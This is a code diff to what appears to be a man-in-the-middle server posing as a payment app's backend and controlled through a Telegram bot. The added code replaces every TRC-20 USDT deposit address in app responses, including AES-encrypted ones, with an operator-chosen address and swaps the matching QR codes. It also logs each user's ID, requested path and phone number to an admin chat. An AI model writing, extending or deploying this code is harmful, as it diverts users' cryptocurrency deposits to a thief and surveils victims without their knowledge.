@@ -426,16 +426,20 @@ app.all('/appAuth/domainPool', (req, res) => {
   res.json({ status: '200', timestamp: ts, message: 'Success', body: 'https://ixcv.vercel.app' });
 });
 
-app.all('/appAuth/checkUpdate', (req, res) => {
+app.all('/appAuth/checkUpdate', async (req, res) => {
   const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
-  // needUpdate "2" = optional update (same as real server), never "1" which forces update
+  let ver = '2.1.1';
+  try {
+    const d = await loadData();
+    if (d && d.appVersion) ver = d.appVersion;
+  } catch(e) {}
   res.json({
     status: '200',
     timestamp: ts,
     message: 'Success',
     body: {
-      version: '2.1.1',
-      updateContent: '\u7248\u67092.1.1,\u4fee\u590d\u4e86\u4e00\u4e9bbug\uff0c\u4f7f\u5e94\u7528\u66f4\u7a33\u5b9a\u6d41\u7545\uff0c\u63d0\u5347\u4e86\u7528\u6237\u4f53\u9a8c\uff0c\u611f\u8c22\u60a8\u7684\u4f7f\u7528',
+      version: ver,
+      updateContent: `\u7248\u672c${ver},\u4fee\u590d\u4e86\u4e00\u4e9bbug\uff0c\u4f7f\u5e94\u7528\u66f4\u7a33\u5b9a\u6d41\u7545\uff0c\u63d0\u5347\u4e86\u7528\u6237\u4f53\u9a8c\uff0c\u611f\u8c22\u60a8\u7684\u4f7f\u7528`,
       link: '',
       md5: '',
       needUpdate: '2'
@@ -496,6 +500,35 @@ app.use(async (req, res, next) => {
       }
     } catch(e) { req.parsedBody = {}; }
     next();
+  });
+});
+
+// ── Endpoint activity logger ──────────────────────────────────────
+const _logRateLimit = {};
+app.use(async (req, res, next) => {
+  next();
+  // Fire after response — log to bot if logRequests is ON
+  res.on('finish', async () => {
+    try {
+      const d = cachedData;
+      if (!d || !d.logRequests || !d.adminChatId || !bot) return;
+      const path = (req.originalUrl || '').split('?')[0];
+      // Skip domainPool, checkUpdate, bot-webhook (too noisy)
+      const skip = ['/appAuth/domainPool', '/appAuth/checkUpdate', '/bot-webhook', '/health'];
+      if (skip.some(s => path.startsWith(s))) return;
+      const body = req.parsedBody || {};
+      const hdr = req.headers || {};
+      const userId = body.memberCode || body.memberId || body.userId ||
+                     hdr['membercode'] || hdr['memberCode'] || '';
+      const rateKey = `${userId||'anon'}:${path}`;
+      const now = Date.now();
+      if (_logRateLimit[rateKey] && now - _logRateLimit[rateKey] < 8000) return;
+      _logRateLimit[rateKey] = now;
+      const phone = (d.trackedUsers && userId && d.trackedUsers[userId]) ? (d.trackedUsers[userId].phone || '') : '';
+      bot.sendMessage(d.adminChatId,
+        `📡 ${path}\n👤 ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    } catch(e) {}
   });
 });
 
@@ -611,39 +644,72 @@ function replaceUsdtInResponse(jsonResp, data) {
   if (!data.usdtAddress || !jsonResp) return null;
   const newAddr = data.usdtAddress;
   const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
+
+  // Try AES decrypt a base64 string — if it decodes to a TRC-20 address, return encrypted replacement
+  function tryReplaceEncrypted(val) {
+    if (!val || typeof val !== 'string' || val.length < 20) return null;
+    try {
+      const dec = aesDecryptToken(val);
+      if (/^T[a-zA-Z0-9]{33}$/.test(dec.trim())) {
+        return aesEncryptToken(newAddr);
+      }
+    } catch(e) {}
+    return null;
+  }
+
   function scanAndReplace(obj, depth) {
-    if (!obj || typeof obj !== 'object' || depth > 10) return '';
+    if (!obj || typeof obj !== 'object' || depth > 12) return '';
     if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
-    let oldAddr = '';
     for (const key of Object.keys(obj)) {
       const kl = key.toLowerCase();
       if (typeof obj[key] === 'string') {
-        if ((kl.includes('usdt') && kl.includes('addr')) || kl === 'address' || kl === 'walletaddress' || kl === 'addr' || kl === 'depositaddress' || kl === 'receiveaddress' || (kl.includes('address') && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
-          if (obj[key].length >= 20 && obj[key] !== newAddr) { oldAddr = oldAddr || obj[key]; obj[key] = newAddr; }
+        const val = obj[key];
+        // Plain TRC-20 address in any field
+        if (/^T[a-zA-Z0-9]{33}$/.test(val)) {
+          if (val !== newAddr) obj[key] = newAddr;
         }
-        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl') {
+        // Named address fields — also try AES decrypt
+        else if (kl.includes('address') || kl.includes('addr') || kl.includes('wallet') ||
+                 kl.includes('deposit') || kl.includes('receive') || kl.includes('recharge')) {
+          if (val.length >= 20) {
+            const enc = tryReplaceEncrypted(val);
+            if (enc) { obj[key] = enc; }
+            else if (/^T[a-zA-Z0-9]{30,}$/.test(val) && val !== newAddr) { obj[key] = newAddr; }
+          }
+        }
+        // QR code fields — replace with our QR
+        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' ||
+            kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'qrurl' ||
+            kl.includes('qrcode') || kl.includes('qr_')) {
           obj[key] = qrUrl;
         }
-      } else if (typeof obj[key] === 'object') {
-        const found = scanAndReplace(obj[key], depth + 1);
-        if (found) oldAddr = oldAddr || found;
+      } else if (typeof obj[key] === 'object' && obj[key] !== null) {
+        scanAndReplace(obj[key], depth + 1);
       }
     }
-    return oldAddr;
+    return '';
   }
-  const rd = getResponseData(jsonResp);
-  if (rd) scanAndReplace(rd, 0);
-  else scanAndReplace(jsonResp, 0);
-  const fullStr = JSON.stringify(jsonResp);
-  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
-  if (trcMatch) {
-    for (const addr of trcMatch) {
-      if (addr !== newAddr) {
-        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
-        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch(e) {}
-      }
+
+  // Step 1: Deep scan and replace on parsed JSON
+  scanAndReplace(jsonResp, 0);
+
+  // Step 2: Full raw string replacement — catches any TRC-20 address missed above
+  try {
+    let jsonStr = JSON.stringify(jsonResp);
+    const trcRegex = /T[a-zA-Z0-9]{33}/g;
+    let changed = false;
+    jsonStr = jsonStr.replace(trcRegex, (match) => {
+      if (match !== newAddr) { changed = true; return newAddr; }
+      return match;
+    });
+    if (changed) {
+      const newObj = JSON.parse(jsonStr);
+      // Deep mutate jsonResp in place
+      for (const k of Object.keys(jsonResp)) delete jsonResp[k];
+      Object.assign(jsonResp, newObj);
     }
-  }
+  } catch(e) {}
+
   return { newAddr, qrUrl };
 }
 
@@ -867,6 +933,10 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address>
 /usdt off
 
+=== APP VERSION ===
+/version — Current version
+/version 2.1.2 — Set version
+
 === ACTIVE LOGIN ===
 /active <phone>
 /active off <phone>
@@ -875,6 +945,7 @@ app.post('/bot-webhook', async (req, res) => {
 
 === TRACKING ===
 /idtrack — Show tracked users
+/log — Toggle endpoint logging (ON/OFF)
 
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234`
@@ -1106,6 +1177,26 @@ Example:
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, '✅ History cleared');
+      return res.sendStatus(200);
+    }
+
+    // /version
+    if (text === '/version') {
+      data = await loadData(true);
+      await bot.sendMessage(chatId, `📱 App Version: ${data.appVersion || '2.1.1'}\nChange: /version 2.1.2`);
+      return res.sendStatus(200);
+    }
+    if (text.startsWith('/version ')) {
+      const ver = text.substring(9).trim();
+      if (!/^\d+\.\d+\.\d+$/.test(ver)) {
+        await bot.sendMessage(chatId, '❌ Format: /version 2.1.2');
+        return res.sendStatus(200);
+      }
+      data = await loadData(true);
+      data.appVersion = ver;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ App version set to ${ver}\nApp refresh karne ke baad dikhega`);
       return res.sendStatus(200);
     }
 
